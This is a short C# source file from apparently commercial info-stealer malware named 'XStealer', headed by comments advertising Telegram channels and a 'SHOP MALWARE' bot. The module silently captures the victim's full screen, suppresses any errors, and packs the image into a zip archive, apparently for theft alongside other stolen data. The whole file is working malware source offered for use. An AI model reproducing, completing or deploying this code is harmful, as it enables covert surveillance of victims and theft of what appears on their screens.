// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Machine
{
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Windows.Forms;

    public static class ScreenShot
    {
        public static void Inizialize() 
        {
            using var ms = new MemoryStream { Position = 0 };
            int width = Screen.PrimaryScreen.Bounds.Width, height = Screen.PrimaryScreen.Bounds.Height;
            try
            {
                using var bitmap = new Bitmap(width, height);
                using var graph = Graphics.FromImage(bitmap);
                graph.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                bitmap?.Save(ms, ImageFormat.Png);
                ZipEx.AddKeyPairStream("ScreenShot.png", ms?.ToArray() ?? ms.GetBuffer() ?? null);
            }
            catch { }
        }
    }
}